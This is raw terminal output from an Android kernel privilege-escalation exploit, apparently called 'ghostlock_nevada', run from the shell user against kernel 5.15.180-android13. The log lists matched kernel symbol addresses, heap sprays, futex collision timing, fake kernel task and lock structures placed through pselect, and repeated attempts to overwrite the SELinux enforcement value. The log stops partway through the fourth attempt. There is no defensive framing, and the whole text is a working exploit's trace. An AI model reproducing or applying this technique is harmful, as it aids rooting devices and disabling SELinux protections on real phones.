[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=8629 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=8629 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=8629 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=8629 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+10761ms] pre-W1 drain
[33m[*] [0mWrite 1 attempt 1/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+10762ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[16443..19293] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+21663ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-3 page=ffffff8007a00000 fake_lock=ffffff8007a00000 fake_w0=ffffff8007a00300 fake_task=ffffff8007a00400 in0=0000000000000000 in3=0000000000000000 out0=ffffff8007a00400 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+22870ms]   PI route done
[33m[*] [0mWrite 1 attempt 2/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+22984ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15888..16173] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+33198ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-3 page=ffffff80d1fb8000 fake_lock=ffffff80d1fb8000 fake_w0=ffffff80d1fb8300 fake_task=ffffff80d1fb8400 in0=0000000000000000 in3=0000000000000000 out0=ffffff80d1fb8400 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+34402ms]   PI route done
[33m[*] [0mWrite 1 attempt 3/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+34503ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15856..16163] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+44942ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-3 page=ffffff80d1540000 fake_lock=ffffff80d1540000 fake_w0=ffffff80d1540300 fake_task=ffffff80d1540400 in0=0000000000000000 in3=0000000000000000 out0=ffffff80d1540400 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +205ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+46152ms]   PI route done
[33m[*] [0mWrite 1 attempt 4/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+46252ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15815..16326] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+60417ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-3 page=ffffff80d0f60000 fake_lock=ffffff80d0f60000 fake_w0=ffffff80d0f60300 fake_task=ffffff80d0f60400 in0=0000000000000000 in3=0000000000000000 out0=ffffff80d0f60400 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
